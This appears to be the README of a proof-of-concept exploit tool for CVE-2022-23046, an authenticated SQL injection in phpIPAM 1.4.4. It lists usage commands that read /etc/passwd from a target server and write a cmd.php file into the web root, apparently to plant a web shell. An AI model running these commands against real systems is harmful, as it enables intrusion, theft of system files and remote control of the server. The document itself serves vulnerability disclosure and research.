# CVE-2022-23046 phpIPAM 1.4.4 - SQL Injection

phpIPAM v1.4.4 allows an authenticated admin user to inject SQL sentences in the subnet parameter while searching a subnet via app/admin/routing/edit-bgp-mapping-search.php. This project currently prints out database information and host version information. It can also attempt to read files and write to the server as well.

## Getting Started

### Executing program

* To check if it is vulnerable.
```
python3 phpipam_1.4.4.py -t http://phpipam.com/ -u username -p password
```
* For test for file read
```
python3 phpipam_1.4.4.py -t http://phpipam.com/ -u username -p password -f /etc/passwd
```
* For test for file write
```
python3 phpipam_1.4.4.py -t http://phpipam.com/ -u username -p password -w /var/www/html/cmd.php
```

## Help

For Help Menu
```
python3 phpipam_1.4.4.py -h
```

## Acknowledgments

* [FluidAttacks](https://fluidattacks.com/advisories/mercury/)

## Disclaimer
All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.